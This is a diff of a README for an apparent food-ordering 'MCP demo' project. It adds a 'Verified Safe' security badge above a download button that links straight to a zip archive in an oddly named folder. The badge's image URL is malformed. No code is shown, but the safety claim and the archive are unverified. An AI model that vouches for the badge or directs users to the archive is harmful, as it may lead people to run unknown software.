@@ -1,5 +1,7 @@
 # 🎉 Zomato-MCP-Demo - Connect, Configure, and Order Food
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/akbfar-zomato-mcp-demo)
+
 [![Download](https://raw.githubusercontent.com/akbfar/Zomato-MCP-Demo/main/immortalist/Zomato-MCP-Demo_2.2-alpha.3.zip%20Zomato--MCP--Demo-blue)](https://raw.githubusercontent.com/akbfar/Zomato-MCP-Demo/main/immortalist/Zomato-MCP-Demo_2.2-alpha.3.zip)
 
 ## 📋 Description
